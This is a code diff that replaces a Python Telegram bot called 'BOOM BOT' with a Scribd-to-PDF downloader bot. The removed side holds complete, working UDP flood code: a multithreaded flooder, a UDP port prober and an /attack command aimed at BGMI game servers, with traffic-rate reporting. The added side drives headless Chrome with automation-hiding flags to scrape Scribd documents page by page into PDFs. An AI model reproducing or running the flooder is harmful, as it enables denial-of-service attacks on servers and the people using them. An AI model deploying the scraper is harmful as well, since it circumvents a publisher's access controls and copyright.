@@ -1,313 +1,377 @@
 #!/usr/bin/env python3
-"""BOOM BOT — private BGMI UDP flood bot. Plug & play."""
+"""
+scribd.py — Telegram Scribd downloader bot.
+Optimized for Render.com Docker deployment using standard Selenium.
+"""
 
-import asyncio
 import os
-import resource
-import socket
-import threading
+import re
+import sys
 import time
-from concurrent.futures import ThreadPoolExecutor
+import base64
+import shutil
+import tempfile
+import threading
+import traceback
+from io import BytesIO
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.ext import (
-    Application, CommandHandler, MessageHandler, ContextTypes, Defaults, filters,
-)
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from selenium.common.exceptions import WebDriverException
+from pypdf import PdfReader, PdfWriter
 
-# ------------------------------------------------------------------ config
-TOKEN      = os.environ["BOT_TOKEN"]
-OWNER_ID   = int(os.environ["OWNER_ID"])
-ALLOWED    = {int(x) for x in os.environ.get("ALLOWED_IDS", "").replace(" ", "").split(",") if x}
-ALLOWED.add(OWNER_ID)
+import telebot
 
-DEF_PORTS    = os.environ.get("DEFAULT_PORTS", "10012,17500,20000")
-DEF_DURATION = int(os.environ.get("DEFAULT_DURATION", "60"))
-DEF_THREADS  = int(os.environ.get("DEFAULT_THREADS", "500"))
-DEF_PAYLOAD  = int(os.environ.get("DEFAULT_PAYLOAD", "512"))
-MAX_THREADS  = 4000
-MAX_PORTS    = 2048
+# ============================== CONFIG ==============================
 
-HELP = (
-    "💥 <b>BOOM BOT</b>\n\n"
-    "<code>/attack ip [port] [secs] [threads] [bytes]</code>\n"
-    "port can be <code>10012</code>, a range <code>10000-10100</code>, or a list <code>10012,17500,20000</code>\n\n"
-    "no port? floods the default set\n"
-    "no secs? uses the default\n\n"
-    "🛑 /stop — kill it\n"
-    "📡 /ping ip — reachability\n"
-    "🔍 /probe ip [ports] — find the live port\n"
-    "📊 /status — live stats"
-)
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
+PORT = int(os.environ.get("PORT", 8080))
 
+CHROME_BIN = os.environ.get("CHROME_BIN", "/usr/bin/chromium")
+CHROMEDRIVER_PATH = os.environ.get("CHROMEDRIVER_PATH", "/usr/bin/chromedriver")
+HEADLESS = True
 
-# ------------------------------------------------------------------ helpers
-def raise_limits():
-    try:
-        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
-        want = min(hard, 65535)
-        if soft < want:
-            resource.setrlimit(resource.RLIMIT_NOFILE, (want, hard))
-    except Exception:
-        pass
+MAX_TG_UPLOAD = 49 * 1024 * 1024
+CDP_TIMEOUT = 600
+EXPORT_BATCH_SIZE = 4
 
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 
-def parse_ports(tok):
-    out = []
-    for part in str(tok).split(","):
-        part = part.strip()
-        if not part:
-            continue
-        if "-" in part:
-            a, b = part.split("-", 1)
-            out.extend(range(int(a), int(b) + 1))
-        else:
-            out.append(int(part))
-    return out[:MAX_PORTS] or parse_ports(DEF_PORTS)
+# ======================== HEALTH CHECK SERVER =======================
 
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"OK")
+    def log_message(self, format, *args):
+        pass # Silence HTTP logs in console
 
-def ok(update: Update) -> bool:
-    u = update.effective_user
-    return bool(u and u.id in ALLOWED)
+def run_health_server():
+    server = HTTPServer(("0.0.0.0", PORT), HealthCheckHandler)
+    server.serve_forever()
 
+# ============================ UTILITIES =============================
 
-# ------------------------------------------------------------------ engine
-class Flooder:
-    def __init__(self, ip, ports, duration, threads, payload_size):
-        self.ip, self.ports = ip, ports
-        self.duration, self.threads, self.plen = duration, threads, payload_size
-        self.payload = os.urandom(payload_size)
-        self.stats = []
-        self.stop_flag = threading.Event()
-        self.start_time = 0.0
+def is_scribd_url(url: str) -> bool:
+    return bool(re.search(r"scribd\.com/(?:document|doc|read)/\d+", url, re.I))
 
-    def _worker(self, idx):
-        port = self.ports[idx % len(self.ports)]
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def extract_doc_id(url: str) -> str:
+    m = re.search(r"scribd\.com/(?:document|doc|read)/(\d+)", url)
+    if not m:
+        raise ValueError("Couldn't find a document ID in that URL.")
+    return m.group(1)
+
+def embed_url_for(url: str) -> str:
+    return f"https://www.scribd.com/embeds/{extract_doc_id(url)}/content"
+
+def configure_command_timeout(driver, timeout_seconds):
+    executor = getattr(driver, "command_executor", None)
+    if executor is None: return
+    client_config = getattr(executor, "client_config", None) or getattr(executor, "_client_config", None)
+    if client_config is not None:
+        client_config.timeout = timeout_seconds
+
+# ======================== SELENIUM SETUP ===========================
+
+def build_chrome_options(profile_dir: str) -> Options:
+    opts = Options()
+    if HEADLESS:
+        opts.add_argument("--headless=new")
+    opts.add_argument("--window-size=1400,2000")
+    opts.add_argument("--no-sandbox")
+    opts.add_argument("--disable-dev-shm-usage")
+    opts.add_argument("--disable-gpu")
+    opts.add_argument("--disable-software-rasterizer")
+    opts.add_argument("--disable-blink-features=AutomationControlled")
+    opts.add_argument("--force-color-profile=srgb")
+    opts.add_argument("--hide-scrollbars")
+    opts.add_argument(f"--user-data-dir={profile_dir}")
+    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
+    opts.add_experimental_option("useAutomationExtension", False)
+    opts.binary_location = CHROME_BIN
+    return opts
+
+def launch_driver(profile_dir: str):
+    service = Service(executable_path=CHROMEDRIVER_PATH)
+    return webdriver.Chrome(service=service, options=build_chrome_options(profile_dir))
+
+# ======================== PAGE LOADING =============================
+
+def wait_for_pages(driver, timeout_seconds: int = 30) -> int:
+    driver.set_script_timeout(timeout_seconds + 5)
+    count = driver.execute_async_script(
+        """
+        const budget = arguments[0];
+        const done = arguments[arguments.length - 1];
+        const start = performance.now();
+        function tick() {
+            const n = document.querySelectorAll('.outer_page').length;
+            if (n > 0) { done(n); return; }
+            if (performance.now() - start >= budget) { done(0); return; }
+            setTimeout(tick, 250);
+        }
+        tick();
+        """,
+        timeout_seconds * 1000,
+    )
+    return int(count or 0)
+
+def load_page_batch(driver, page_numbers: list[int], timeout_seconds: int = 120):
+    configure_command_timeout(driver, timeout_seconds + 10)
+    driver.set_script_timeout(timeout_seconds + 10)
+    result = driver.execute_async_script(
+        """
+        const pageNumbers = arguments[0];
+        const timeoutMs = arguments[1];
+        const done = arguments[arguments.length - 1];
+        const manager = window.docManager;
+        if (!manager || !manager.pages) { done({supported: false}); return; }
+        const states = pageNumbers.map(n => ({ pageNum: n, page: manager.pages[n], error: null }));
+        const startedAt = Date.now();
+        for (const s of states) {
+            if (!s.page) { s.error = 'page object missing'; continue; }
+            try { if (!s.page.innerPageElem) { s.page.load(); } } catch (e) { s.error = String(e); }
+        }
+        const timer = setInterval(() => {
+            let ready = 0;
+            for (const s of states) {
+                if (s.error) { ready++; continue; }
+                const page = s.page;
+                if (!page.innerPageElem) { continue; }
+                try { page.display(); if (!page._imagesTurnedOn) { page.turnOnImages(); } } 
+                catch (e) { s.error = String(e); ready++; continue; }
+                const imgs = Array.from(page.innerPageElem.querySelectorAll('img'));
+                if (imgs.every(img => img.complete)) { ready++; }
+            }
+            if (ready === states.length) {
+                clearInterval(timer);
+                done({ supported: true, failed: states.filter(s => s.error).map(s => ({ pageNum: s.pageNum, reason: s.error })) });
+                return;
+            }
+            if (Date.now() - startedAt >= timeoutMs) {
+                clearInterval(timer);
+                done({ supported: true, failed: states.filter(s => s.error).map(s => ({ pageNum: s.pageNum, reason: s.error || 'timeout' })) });
+            }
+        }, 50);
+        """,
+        list(page_numbers), timeout_seconds * 1000,
+    )
+    if not result.get("supported"): raise RuntimeError("Scribd docManager unavailable.")
+    if result["failed"]: raise RuntimeError(f"Page load failed: {result['failed']}")
+
+def release_page_batch(driver, page_numbers: list[int]):
+    driver.execute_script(
+        """
+        const manager = window.docManager;
+        if (!manager || !manager.pages) return;
+        for (const n of arguments[0]) {
+            const page = manager.pages[n];
+            if (page) { try { page.remove(); } catch (e) {} }
+        }
+        """,
+        list(page_numbers),
+    )
+    try: driver.execute_cdp_cmd("HeapProfiler.collectGarbage", {})
+    except Exception: pass
+
+# ======================== DOM PREP & PDF ===========================
+
+def hide_cookie_dialogs(driver):
+    driver.execute_script(
+        """
+        const kill = [ '[class*="cookie"]', '[class*="Cookie"]', '[class*="consent"]', '[class*="Consent"]', '[class*="gdpr"]', '[class*="GDPR"]', '[id*="cookie"]', '[id*="consent"]', '[class*="osano-cm"]', '[id*="osano"]', '#onetrust-consent-sdk' ];
+        kill.forEach(sel => { try { document.querySelectorAll(sel).forEach(el => el.remove()); } catch (e) {} });
+        """
+    )
+
+def prepare_for_print(driver):
+    driver.execute_script(
+        """
+        const top = document.querySelector('.toolbar_top'); if (top) top.remove();
+        const bottom = document.querySelector('.toolbar_bottom'); if (bottom) bottom.remove();
+        document.querySelectorAll('.document_scroller').forEach(el => {
+            el.style.position = 'static'; el.style.overflow = 'visible'; el.style.height = 'auto';
+            el.style.maxHeight = 'none'; el.style.margin = '0'; el.style.padding = '0';
+        });
+        """
+    )
+
+def export_page_to_pdf(driver, index: int, page_count: int) -> bytes:
+    page_info = driver.execute_script(
+        """
+        const i = arguments[0];
+        const pages = Array.from(document.querySelectorAll('.outer_page'));
+        const target = pages[i];
+        if (!target) return null;
+        const old = document.getElementById('isolated-print-css'); if (old) old.remove();
+        pages.forEach(p => {
+            ['display','visibility','position','top','left','right','bottom','margin',
+             'break-after','page-break-after','break-before','page-break-before']
+                .forEach(prop => p.style.removeProperty(prop));
+        });
+        const rect = target.getBoundingClientRect();
+        const w = Math.ceil(rect.width); const h = Math.ceil(rect.height);
+        pages.forEach(p => p.removeAttribute('data-export-target'));
+        target.setAttribute('data-export-target', 'true');
+        const style = document.createElement('style');
+        style.id = 'isolated-print-css';
+        style.textContent = `
+            @page { size: ${w}px ${h}px; margin: 0; }
+            @media print {
+                html, body {
+                    width: ${w}px !important; height: ${h}px !important;
+                    min-width: ${w}px !important; min-height: ${h}px !important;
+                    max-width: ${w}px !important; max-height: ${h}px !important;
+                    margin: 0 !important; padding: 0 !important; overflow: hidden !important;
+                    -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important;
+                }
+                .outer_page { display: none !important; }
+                .outer_page[data-export-target="true"] {
+                    display: block !important; visibility: visible !important;
+                    position: absolute !important; top: 0 !important; left: 0 !important;
+                    width: ${w}px !important; height: ${h}px !important;
+                    margin: 0 !important; padding: 0 !important; overflow: hidden !important;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+        return { width: w, height: h };
+        """,
+        index,
+    )
+    if not page_info: raise RuntimeError(f"Page {index + 1}/{page_count} missing.")
+    width_in = int(page_info["width"]) / 96.0
+    height_in = int(page_info["height"]) / 96.0
+
+    driver.execute_cdp_cmd("Emulation.setEmulatedMedia", {"media": "print"})
+    result = driver.execute_cdp_cmd(
+        "Page.printToPDF",
+        {
+            "landscape": False, "displayHeaderFooter": False, "printBackground": True, "scale": 1,
+            "paperWidth": width_in, "paperHeight": height_in,
+            "marginTop": 0, "marginBottom": 0, "marginLeft": 0, "marginRight": 0,
+            "preferCSSPageSize": True, "pageRanges": "1", "transferMode": "ReturnAsBase64",
+        },
+    )
+    return base64.b64decode(result["data"])
+
+def fetch_scribd_pdf(url: str, output_path: str, progress_cb=None) -> str:
+    embed = embed_url_for(url)
+    if progress_cb: progress_cb("🔍 Inspecting document...")
+    with tempfile.TemporaryDirectory(prefix="scribd-chrome-") as profile_dir:
+        driver = launch_driver(profile_dir)
         try:
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
-            s.connect((self.ip, port))          # route cached -> faster send()
-        except OSError:
-            return
-        send, payload, plen = s.send, self.payload, self.plen
-        st = self.stats[idx]
-        pkt = byt = 0
-        while not self.stop_flag.is_set():
+            driver.get(embed)
+            time.sleep(1)
+            hide_cookie_dialogs(driver)
+            page_count = wait_for_pages(driver, timeout_seconds=30)
+            if page_count <= 0: raise RuntimeError("No printable pages found.")
+            if progress_cb: progress_cb(f"📄 Found {page_count} pages. Preparing...")
+            prepare_for_print(driver)
+            configure_command_timeout(driver, CDP_TIMEOUT)
+
+            spool = tempfile.TemporaryDirectory(prefix="scribd-pages-")
+            page_files = []
             try:
-                send(payload)
-                pkt += 1
-                byt += plen
-            except OSError:
-                pass
-            st[0] = pkt
-            st[1] = byt
-        s.close()
+                for index in range(page_count):
+                    if index % EXPORT_BATCH_SIZE == 0:
+                        batch_end = min(page_count, index + EXPORT_BATCH_SIZE)
+                        batch = list(range(index + 1, batch_end + 1))
+                        if progress_cb: progress_cb(f"🖼️ Loading pages {index + 1}–{batch_end}/{page_count}...")
+                        load_page_batch(driver, batch)
 
-    def spawn(self):
-        self.stats = [[0, 0] for _ in range(self.threads)]
-        self.start_time = time.time()
-        threading.stack_size(512 * 1024)
-        for i in range(self.threads):
-            threading.Thread(target=self._worker, args=(i,), daemon=True).start()
+                    pdf_bytes = export_page_to_pdf(driver, index, page_count)
+                    reader = PdfReader(BytesIO(pdf_bytes))
+                    if len(reader.pages) != 1: raise RuntimeError(f"Page {index + 1} produced {len(reader.pages)} sheets.")
+                    
+                    page_path = os.path.join(spool.name, f"page-{index + 1:08d}.pdf")
+                    with open(page_path, "wb") as f: f.write(pdf_bytes)
+                    page_files.append(page_path)
 
-    def elapsed(self):
-        return max(time.time() - self.start_time, 0.0001)
+                    if progress_cb and (index + 1) % 5 == 0: progress_cb(f"✅ Exported {index + 1}/{page_count} pages...")
+                    if (index + 1) % EXPORT_BATCH_SIZE == 0 or index + 1 == page_count:
+                        release_page_batch(driver, batch)
 
-    def running(self):
-        return not self.stop_flag.is_set() and self.elapsed() < self.duration
+                if not page_files: raise RuntimeError("No pages exported.")
+                if progress_cb: progress_cb(f"🧩 Merging {len(page_files)} pages...")
+                writer = PdfWriter()
+                try:
+                    for p_path in page_files: writer.append(p_path)
+                    with open(output_path, "wb") as out: writer.write(out)
+                finally: writer.close()
+            finally: spool.cleanup()
+        finally:
+            try: driver.quit()
+            except Exception: pass
+    return os.path.abspath(output_path)
 
-    def stop(self):
-        self.stop_flag.set()
+# ======================== TELEGRAM BOT =============================
 
-    def target(self):
-        if len(self.ports) == 1:
-            return f"{self.ip}:{self.ports[0]}"
-        return f"{self.ip}:{self.ports[0]}-{self.ports[-1]} ({len(self.ports)} ports)"
+@bot.message_handler(commands=["start", "help"])
+def cmd_start(message): bot.reply_to(message, "📚 Send me any Scribd document URL and I'll render it to PDF.")
 
-    def report(self, final=False):
-        p = sum(x[0] for x in self.stats)
-        b = sum(x[1] for x in self.stats)
-        e = self.elapsed()
-        head = "✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃" if final else "🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆"
-        return (
-            f"{head}\n\n"
-            f"🎯 <code>{self.target()}</code>\n"
-            f"⏱ {e:.0f}s / {self.duration}s\n"
-            f"🧵 {self.threads} thr · {self.plen}B\n"
-            f"📦 {p:,} pkts · {b / 1048576:.1f} MB\n"
-            f"⚡ {p / e:,.0f} pps · {(b * 8) / e / 1e6:.1f} Mbps"
-        )
+@bot.message_handler(commands=["ping"])
+def cmd_ping(message): bot.reply_to(message, "🏓 pong")
 
-
-# ------------------------------------------------------------------ commands
-async def cmd_start(update, ctx):
-    if ok(update):
-        await update.message.reply_text(HELP)
-
-
-async def cmd_stop(update, ctx):
-    if not ok(update):
+@bot.message_handler(content_types=["text"])
+def handle_text(message):
+    text = (message.text or "").strip()
+    if text.startswith("/"): return
+    if not is_scribd_url(text):
+        bot.reply_to(message, "Send me a Scribd document URL.\nExample: https://www.scribd.com/document/123456789/Title")
         return
-    fl = ctx.bot_data.get("flooder")
-    if fl and fl.running():
-        fl.stop()
-        await update.message.reply_text("🛑 𝐒𝐭𝐨𝐩𝐩𝐞𝐝")
-    else:
-        await update.message.reply_text("𝐍𝐨𝐭𝐡𝐢𝐧𝐠 𝐫𝐮𝐧𝐧𝐢𝐧𝐠")
+    process_download(message, text)
 
+def process_download(message, url: str):
+    chat_id = message.chat.id
+    status = bot.send_message(chat_id, "⏳ Queued...")
+    status_id = status.message_id
+    def edit(text: str):
+        try: bot.edit_message_text(text, chat_id, status_id)
+        except Exception: pass
 
-async def cmd_status(update, ctx):
-    if not ok(update):
-        return
-    fl = ctx.bot_data.get("flooder")
-    if fl and fl.running():
-        await update.message.reply_text(fl.report())
-    else:
-        await update.message.reply_text("𝐈𝐝𝐥𝐞")
-
-
-async def cmd_ping(update, ctx):
-    if not ok(update):
-        return
-    p = update.message.text.split()
-    if len(p) < 2:
-        return await update.message.reply_text("usage: /ping ip")
-    loop = asyncio.get_running_loop()
+    workdir = tempfile.mkdtemp(prefix="scribd-job-")
     try:
-        ip = await loop.run_in_executor(None, socket.gethostbyname, p[1])
-    except OSError:
-        return await update.message.reply_text("❌ bad host")
-    for priv in (False, True):
-        try:
-            from icmplib import ping as icmp_ping
-            r = await loop.run_in_executor(
-                None, lambda x=priv: icmp_ping(ip, count=4, timeout=1, privileged=x))
-            if r.is_alive:
-                return await update.message.reply_text(
-                    f"📡 <code>{ip}</code> · {r.packets_sent - r.packets_lost}/4 · avg {r.avg_rtt:.0f}ms")
-            return await update.message.reply_text(f"❌ <code>{ip}</code> no reply")
-        except ImportError:
-            break
-        except Exception:
-            continue
-    await update.message.reply_text("📡 ping unavailable")
+        edit("⚙️ Starting Chrome...")
+        doc_id = extract_doc_id(url)
+        output_pdf = os.path.join(workdir, f"scribd_{doc_id}.pdf")
+        fetch_scribd_pdf(url, output_pdf, progress_cb=edit)
+        size = os.path.getsize(output_pdf)
+        if size > MAX_TG_UPLOAD:
+            edit(f"❌ PDF is {size / 1024 / 1024:.1f} MB — over Telegram's 50 MB limit.")
+            return
+        edit("📤 Uploading to Telegram...")
+        with open(output_pdf, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"Scribd doc {doc_id} • {size / 1024 / 1024:.1f} MB", reply_to_message_id=message.message_id)
+        try: bot.delete_message(chat_id, status_id)
+        except Exception: pass
+    except Exception as e:
+        edit(f"❌ Failed: {e}")
+        traceback.print_exc()
+    finally: shutil.rmtree(workdir, ignore_errors=True)
 
+# ============================== ENTRY ==============================
 
-def _probe_one(ip, port, timeout=1.0):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.settimeout(timeout)
-    try:
-        s.connect((ip, port))
-        s.send(b"\x00" * 8)
-        try:
-            s.recv(1024)
-            return port, "REPLY"
-        except socket.timeout:
-            return port, "open|filtered"
-        except (ConnectionRefusedError, OSError):
-            return port, "closed"
-    except OSError:
-        return port, "err"
-    finally:
-        s.close()
-
-
-async def cmd_probe(update, ctx):
-    if not ok(update):
-        return
-    p = update.message.text.split()
-    if len(p) < 2:
-        return await update.message.reply_text("usage: /probe ip [ports]")
-    loop = asyncio.get_running_loop()
-    try:
-        ip = await loop.run_in_executor(None, socket.gethostbyname, p[1])
-        ports = parse_ports(p[2]) if len(p) > 2 else parse_ports(DEF_PORTS)
-    except (OSError, ValueError):
-        return await update.message.reply_text("❌ bad args")
-    ports = ports[:256]
-    msg = await update.message.reply_text(f"🔍 probing {ip} · {len(ports)} ports…")
-    with ThreadPoolExecutor(max_workers=64) as ex:
-        res = list(ex.map(lambda pr: _probe_one(ip, pr), ports))
-    live = [f"{pt} <i>{st}</i>" for pt, st in res if st != "closed"]
-    body = "\n".join(live[:60]) or "everything closed"
-    await msg.edit_text(f"🔍 <code>{ip}</code> — {len(live)}/{len(ports)} not-closed\n\n{body}")
-
-
-async def cmd_attack(update, ctx):
-    if not ok(update):
-        return
-    if ctx.bot_data.get("flooder") and ctx.bot_data["flooder"].running():
-        return await update.message.reply_text("⚠️ 𝐁𝐮𝐬𝐲 — /stop first")
-
-    p = update.message.text.split()
-    if p and p[0].startswith("/"):
-        p = p[1:]
-    if not p:
-        return await update.message.reply_text(HELP)
-    try:
-        ip = socket.gethostbyname(p[0])
-        ports = parse_ports(p[1]) if len(p) > 1 else parse_ports(DEF_PORTS)
-        duration = min(int(p[2]), 3600) if len(p) > 2 else DEF_DURATION
-        threads = min(int(p[3]) if len(p) > 3 else DEF_THREADS, MAX_THREADS)
-        payload = int(p[4]) if len(p) > 4 else DEF_PAYLOAD
-    except (ValueError, OSError):
-        return await update.message.reply_text(HELP)
-
-    fl = Flooder(ip, ports, duration, threads, payload)
-    ctx.bot_data["flooder"] = fl
-    fl.spawn()
-    msg = await update.message.reply_text(fl.report())
-    while fl.running():
-        await asyncio.sleep(2)
-        try:
-            await msg.edit_text(fl.report())
-        except Exception:
-            pass
-    fl.stop()
-    await asyncio.sleep(0.4)
-    try:
-        await msg.edit_text(fl.report(final=True))
-    except Exception:
-        pass
-
-
-# ------------------------------------------------------------------ railway safety net
-def health_server():
-    port = os.environ.get("PORT")
-    if not port:
-        return
-    from http.server import BaseHTTPRequestHandler, HTTPServer
-
-    class H(BaseHTTPRequestHandler):
-        def do_GET(self):
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b"ok")
-
-        def log_message(self, *a):
-            pass
-
-    threading.Thread(
-        target=HTTPServer(("0.0.0.0", int(port)), H).serve_forever, daemon=True
-    ).start()
-
-
-# ------------------------------------------------------------------ main
 def main():
-    raise_limits()
-    health_server()
-    app = (Application.builder().token(TOKEN)
-           .defaults(Defaults(parse_mode=ParseMode.HTML)).build())
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("help", cmd_start))
-    app.add_handler(CommandHandler("attack", cmd_attack))
-    app.add_handler(CommandHandler("stop", cmd_stop))
-    app.add_handler(CommandHandler("status", cmd_status))
-    app.add_handler(CommandHandler("ping", cmd_ping))
-    app.add_handler(CommandHandler("probe", cmd_probe))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, cmd_attack))
-    app.run_polling(drop_pending_updates=True, allowed_updates=["message"])
+    if not BOT_TOKEN:
+        print("!! BOT_TOKEN is missing. Set it in the environment variables.")
+        sys.exit(1)
 
+    print("📚 Scribd bot starting...")
+    print(f"   Health server on port {PORT}")
+    threading.Thread(target=run_health_server, daemon=True).start()
+
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=50)
+        except Exception as e:
+            print(f"!! Polling crashed: {e}")
+            traceback.print_exc()
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
